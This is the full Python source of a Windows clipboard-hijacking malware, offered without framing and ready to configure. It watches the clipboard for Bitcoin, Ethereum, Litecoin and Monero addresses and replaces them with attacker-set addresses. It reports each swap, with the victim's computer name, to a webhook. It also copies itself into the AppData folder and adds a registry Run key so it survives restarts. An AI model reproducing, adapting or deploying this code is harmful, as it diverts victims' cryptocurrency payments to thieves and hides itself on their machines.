import ctypes.wintypes as w

import http.client
import subprocess
import socket
import winreg
import ctypes
import shutil
import json
import time
import sys
import re
import os

btcaddr = "SET BTC ADDRESS HERE"
ethaddr = "SET ETH ADDRESS HERE"
ltcaddr = "SET LTC ADDRESS HERE"
xmraddr = "SET XMR ADDRESS HERE"

CF_UNICODETEXT = 13
u32 = ctypes.WinDLL('user32')
k32 = ctypes.WinDLL('kernel32')

single_use = False

ping = False
webhook_url = ""

webhook_parts = webhook_url.replace("https://", "").split("/")
host = webhook_parts[0]
url_path = "/" + "/".join(webhook_parts[1:])

headers = {
    'Content-Type': 'application/json'
}

comp_name = socket.gethostname()

def is_crypto_addr(clipboard_text):
    try:
        btc_address_pattern = r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$"
        eth_address_pattern = r"^(0x)?[0-9a-fA-F]{40}$"
        ltc_address_pattern = r"^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$"
        xmr_address_pattern = r"^4[0-9AB][0-9a-zA-Z]{93}$"
        if re.match(btc_address_pattern, clipboard_text):
            return "BTC"
        elif re.match(eth_address_pattern, clipboard_text):
            return "ETH"
        elif re.match(ltc_address_pattern, clipboard_text):
            return "LTC"
        elif re.match(xmr_address_pattern, clipboard_text):
            return "XMR"
        else:
            return False
    except Exception:
        return False

def main():
    while True:
        try:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            
            OpenClipboard = u32.OpenClipboard
            OpenClipboard.argtypes = w.HWND,
            OpenClipboard.restype = w.BOOL
            GetClipboardData = u32.GetClipboardData
            GetClipboardData.argtypes = w.UINT,
            GetClipboardData.restype = w.HANDLE
            GlobalLock = k32.GlobalLock
            GlobalLock.argtypes = w.HGLOBAL,
            GlobalLock.restype = w.LPVOID
            GlobalUnlock = k32.GlobalUnlock
            GlobalUnlock.argtypes = w.HGLOBAL,
            GlobalUnlock.restype = w.BOOL
            CloseClipboard = u32.CloseClipboard
            CloseClipboard.argtypes = None
            CloseClipboard.restype = w.BOOL

            if OpenClipboard(None):
                h_clip_mem = GetClipboardData(CF_UNICODETEXT)
                clipboard = ctypes.wstring_at(GlobalLock(h_clip_mem))
                GlobalUnlock(h_clip_mem)
                CloseClipboard()

                var = is_crypto_addr(clipboard)
                
                if var == "BTC":
                    if btcaddr != "SET BTC ADDRESS HERE":
                        subprocess.check_call('echo %s |clip' % str(btcaddr).strip(), shell=True)
                        if single_use:
                            with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
                                o.write("True")
                                o.close()
                            sys.exit()
                        if webhook_url != "":
                            if ping:
                                message = {
                                "content": f"@everyone```\ndetected BTC address on {comp_name} - changed to {btcaddr}\n```"
                                }
                            else:
                                message = {
                                    "content": f"```\ndetected BTC address on {comp_name} - changed to {btcaddr}\n```"
                                }

                            json_data = json.dumps(message)

                            conn = http.client.HTTPSConnection(host)
                            conn.request("POST", url_path, json_data, headers)

                            response = conn.getresponse()

                            response.read()
                            conn.close()
                elif var == "ETH":
                    if ethaddr != "SET ETH ADDRESS HERE":
                        subprocess.check_call('echo %s |clip' % str(ethaddr).strip(), shell=True)
                        if single_use:
                            with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
                                o.write("True")
                                o.close()
                            sys.exit()
                        if webhook_url != "":
                            if ping:
                                message = {
                                "content": f"@everyone```\ndetected BTC address on {comp_name} - changed to {ethaddr}\n```"
                                }
                            else:
                                message = {
                                    "content": f"```\ndetected BTC address on {comp_name} - changed to {ethaddr}\n```"
                                }

                            json_data = json.dumps(message)

                            conn = http.client.HTTPSConnection(host)
                            conn.request("POST", url_path, json_data, headers)

                            response = conn.getresponse()

                            response.read()
                            conn.close()
                elif var == "LTC":
                    if ltcaddr != "SET LTC ADDRESS HERE":
                        subprocess.check_call('echo %s |clip' % str(ltcaddr).strip(), shell=True)
                        if single_use:
                            with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
                                o.write("True")
                                o.close()
                            sys.exit()
                        if webhook_url != "":
                            if ping:
                                message = {
                                "content": f"@everyone```\ndetected BTC address on {comp_name} - changed to {ltcaddr}\n```"
                                }
                            else:
                                message = {
                                    "content": f"```\ndetected BTC address on {comp_name} - changed to {ltcaddr}\n```"
                                }

                            json_data = json.dumps(message)

                            conn = http.client.HTTPSConnection(host)
                            conn.request("POST", url_path, json_data, headers)

                            response = conn.getresponse()

                            response.read()
                            conn.close()
                elif var == "XMR":
                    if xmraddr != "SET XMR ADDRESS HERE":
                        subprocess.check_call('echo %s |clip' % str(xmraddr).strip(), shell=True)
                        if single_use:
                            with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
                                o.write("True")
                                o.close()
                            sys.exit()
                        if webhook_url != "":
                            if ping:
                                message = {
                                "content": f"@everyone```\ndetected BTC address on {comp_name} - changed to {xmraddr}\n```"
                                }
                            else:
                                message = {
                                    "content": f"```\ndetected BTC address on {comp_name} - changed to {xmraddr}\n```"
                                }

                            json_data = json.dumps(message)

                            conn = http.client.HTTPSConnection(host)
                            conn.request("POST", url_path, json_data, headers)

                            response = conn.getresponse()

                            response.read()
                            conn.close()
                else:
                    pass
        except Exception:
            pass
        time.sleep(0.15)

def dupe_self():
    try:
        current_script = os.path.abspath(sys.executable)
        appdata_path = os.environ['APPDATA']
        duplicate_directory = os.path.join(appdata_path, 'CLPPTH')
        os.makedirs(duplicate_directory, exist_ok=True)
        duplicate_script = os.path.join(duplicate_directory, "clppth.exe")
        shutil.copyfile(current_script, duplicate_script)
        return duplicate_script
    except Exception:
        return None

def add_reg(dupe_path):
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.HKEY_CURRENT_USER
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_ALL_ACCESS) as reg_key:
            try:
                winreg.QueryValueEx(reg_key, "CLPPTH")
            except FileNotFoundError:
                winreg.SetValueEx(reg_key, "CLPPTH", 0, winreg.REG_SZ, dupe_path)
    except Exception:
        pass

def check():
    try:
        folder_name = "Storage0"
        appdata_path = os.environ['APPDATA']
        folder_path = os.path.join(appdata_path, folder_name)
        if not os.path.exists(os.path.join(folder_path, "storage.txt")):
            os.makedirs(folder_path, exist_ok=True)
            with open(os.path.join(folder_path, "storage.txt"), "w"):
                pass
            dupe_path = dupe_self()
            if dupe_path:
                add_reg(dupe_path)
                main()
        else:
            with open(os.path.join(folder_path, "storage.txt"), "r") as o:
                ln1 = o.readline().strip('\n')
                if ln1 != "True":
                    main()
                else:
                    try:
                        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                        key = winreg.HKEY_CURRENT_USER
                        with winreg.OpenKey(key, key_path, 0, winreg.KEY_ALL_ACCESS) as reg_key:
                            winreg.DeleteValue(reg_key, "CLPPTH")
                    except Exception:
                        pass
    except Exception:
        pass
    
if __name__ == "__main__":
    check()